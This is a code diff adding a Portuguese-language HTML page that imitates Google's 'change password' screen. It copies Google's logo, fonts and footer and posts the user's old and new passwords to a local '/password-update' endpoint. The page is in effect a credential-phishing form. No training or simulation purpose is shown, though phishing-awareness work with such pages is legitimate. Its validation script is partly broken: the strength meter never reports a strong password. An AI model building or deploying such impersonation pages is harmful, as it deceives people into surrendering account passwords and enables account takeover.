@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+	<head>
+		<meta charset="UTF-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<title>Alterar Senha – Contas do Google</title>
+		<link rel="icon" href="https://ssl.gstatic.com/accounts/ui/.png" />
+		<link
+			href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"
+			rel="stylesheet"
+		/>
+		<style>
+			body {
+				font-family: 'Roboto', sans-serif;
+				background-color: #f2f2f2;
+				margin: 0;
+				display: flex;
+				justify-content: center;
+				align-items: center;
+				height: 100vh;
+			}
+
+			.login-box {
+				background-color: #fff;
+				width: 360px;
+				padding: 40px;
+				border-radius: 8px;
+				box-shadow: 0 1px 3px rgba(60, 64, 67, 0.3);
+				text-align: center;
+			}
+
+			.logo {
+				width: 75px;
+				margin-bottom: 20px;
+			}
+
+			h2,
+			h3 {
+				font-weight: normal;
+				color: #202124;
+				font-size: 24px;
+				margin-bottom: 8px;
+			}
+
+			p {
+				font-size: 14px;
+				color: #525558;
+				margin-bottom: 14px;
+			}
+
+			.form-group {
+				position: relative;
+				margin-bottom: 24px;
+				text-align: left;
+			}
+
+			.form-group input {
+				width: 100%;
+				padding: 16px 12px 8px 12px;
+				font-size: 16px;
+				border: 1px solid #dadce0;
+				border-radius: 4px;
+				outline: none;
+				transition: border-color 0.2s ease;
+				background: transparent;
+				width: 93%;
+			}
+
+			.form-group label {
+				position: absolute;
+				left: 12px;
+				top: 16px;
+				color: #5f6368;
+				font-size: 16px;
+				pointer-events: none;
+				transition: 0.2s ease all;
+				background-color: white;
+				padding: 0 4px;
+			}
+
+			.form-group input:focus {
+				border-color: #1a73e8;
+			}
+
+			.form-group input:focus + label,
+			.form-group input:not(:placeholder-shown) + label {
+				top: -8px;
+				font-size: 12px;
+				color: #1a73e8;
+			}
+
+			button {
+				background-color: #1a73e8;
+				color: white;
+				border: none;
+				padding: 12px;
+				font-size: 14px;
+				border-radius: 4px;
+				cursor: pointer;
+				font-weight: 500;
+				transition: background-color 0.2s, color 0.2s;
+				width: 100%;
+			}
+
+			button:hover {
+				background-color: #0b57d0;
+				color: #e8f0fe;
+			}
+
+			.footer {
+				font-size: 12px;
+				color: #5f6368;
+				margin-top: 24px;
+			}
+
+			.error {
+				color: red;
+				font-size: 12px;
+				margin-top: 5px;
+				margin-left: 20px;
+				display: block;
+			}
+
+			.input-error {
+				border: 2px solid red;
+			}
+
+			.form-group input.input-error {
+				border-color: red;
+			}
+
+			.form-group input.input-error + label {
+				color: red;
+				top: -8px;
+				font-size: 12px;
+			}
+
+			.label-error {
+				color: red;
+			}
+		</style>
+	</head>
+
+	<body>
+		<div class="login-box">
+			<img
+				class="logo"
+				src="https://ssl.gstatic.com/accounts/ui/logo_2x.png"
+				alt="Google"
+			/>
+			<h2>Alterar a senha</h2>
+			<p style="margin-left: 20px; text-align: left">
+				Escolha uma senha forte e não a reutilize em outras contas.
+			</p>
+			<p style="margin-left: 20px; text-align: left">
+				Talvez sua conta seja desconectada de alguns dispositivos.
+			</p>
+
+			<form
+				id="password-form"
+				action="/password-update"
+				method="POST"
+				autocomplete="off"
+			>
+				<div class="form-group">
+					<input
+						type="password"
+						name="previousPassword"
+						id="previous-password"
+						placeholder=" "
+						autocomplete="off"
+					/>
+					<label for="previous-password">Senha antiga</label>
+					<span id="previous-password-error" class="error"></span>
+				</div>
+				<div
+					id="password-strength"
+					style="
+						font-size: 16px;
+						color: #202124;
+						margin-top: 20px;
+						margin-bottom: 4px;
+						margin-left: 20px;
+						text-align: left;
+					"
+				>
+					Nível de segurança da senha:
+					<span id="strength-label" style="font-weight: 500"></span>
+				</div>
+				<div
+					style="
+						font-size: 14px;
+						color: #5f6368;
+						margin-bottom: 16px;
+						margin-left: 20px;
+						text-align: left;
+					"
+				>
+					Use pelo menos 8 caracteres. Não use a senha de outro site ou algo
+					muito óbvio, como o nome do seu animal de estimação.
+				</div>
+
+				<div class="form-group">
+					<input
+						type="password"
+						name="newPassword"
+						id="new-password"
+						placeholder=" "
+						autocomplete="off"
+					/>
+					<label for="new-password">Nova Senha</label>
+					<span id="new-password-error" class="error"></span>
+				</div>
+
+				<div class="form-group">
+					<input
+						type="password"
+						name="confirmPassword"
+						id="confirm-password"
+						placeholder=" "
+						autocomplete="off"
+					/>
+					<label for="confirm-password">Confirme sua nova Senha</label>
+					<span id="confirm-password-error" class="error"></span>
+				</div>
+				<button type="submit">Alterar senha</button>
+			</form>
+
+			<div class="footer">Google © 2025</div>
+		</div>
+
+		<script>
+			const passwordInput = document.getElementById('new-password');
+			const strengthLabel = document.getElementById('strength-label');
+			const previousPassword = document.getElementById('previous-password');
+			const newPasswordError = document.getElementById('new-password-error');
+			const previousPasswordError = document.getElementById(
+				'previous-password-error'
+			);
+			const confirmPasswordError = document.getElementById(
+				'confirm-password-error'
+			);
+			const passwordForm = document.getElementById('password-form');
+			const confirmPasswordInput = document.getElementById('confirm-password');
+
+			passwordInput.addEventListener('input', () => {
+				const value = passwordInput.value;
+
+				if (value.length === 0) {
+					strengthLabel.textContent = '';
+					return;
+				}
+
+				if (value.length < 8) {
+					strengthLabel.textContent = 'Muito curta';
+				} else if (
+					!/[A-Z]/.test(value) ||
+					!/[a-z]/.test(value) ||
+					!/[0-9]/.test(value) ||
+					!/[\W_]/.test(value)
+				) {
+					strengthLabel.textContent = 'Relevante';
+				}
+			});
+
+			passwordForm.addEventListener('submit', (event) => {
+				let valid = true;
+
+				// Limpa mensagens de erro anteriores
+				newPasswordError.textContent = '';
+				confirmPasswordError.textContent = '';
+				previousPassword.textContent = '';
+				previousPasswordError.textContent = '';
+				passwordInput.classList.remove('input-error');
+				confirmPasswordInput.classList.remove('input-error');
+
+				if (!previousPassword.value) {
+					previousPasswordError.textContent = 'Este campo é obrigatório';
+					previousPassword.classList.add('input-error');
+					valid = false;
+				} else if (previousPassword.value.length < 6) {
+					valid = false;
+				}
+
+				// Verifica se o campo está vazio
+				if (!passwordInput.value) {
+					newPasswordError.textContent = 'Este campo é obrigatório';
+					passwordInput.classList.add('input-error');
+					valid = false;
+				} else if (passwordInput.value.length < 8) {
+					newPasswordError.textContent = 'Escolha uma senha mais longa';
+					passwordInput.classList.add('input-error');
+					valid = false;
+				}
+
+				if (!confirmPasswordInput.value) {
+					confirmPasswordError.textContent = 'Este campo é obrigatório';
+					confirmPasswordInput.classList.add('input-error');
+					valid = false;
+				} else if (passwordInput.value !== confirmPasswordInput.value) {
+					confirmPasswordError.textContent = 'As senhas não correspondem';
+					confirmPasswordInput.classList.add('input-error');
+					valid = false;
+				}
+
+				if (!valid) {
+					event.preventDefault();
+				}
+			});
+
+			const inputs = document.querySelectorAll('.form-group input');
+
+			inputs.forEach((input) => {
+				input.addEventListener('input', () => {
+					if (input.value.trim() !== '') {
+						input.classList.remove('input-error');
+
+						const errorSpan = input.parentElement.querySelector('.error');
+						if (errorSpan) {
+							errorSpan.textContent = '';
+						}
+					}
+				});
+
+				input.addEventListener('blur', () => {
+					if (input.value.trim() !== '') {
+						input.classList.remove('input-error');
+
+						const errorSpan = input.parentElement.querySelector('.error');
+						if (errorSpan) {
+							errorSpan.textContent = '';
+						}
+					}
+				});
+			});
+		</script>
+	</body>
+</html>
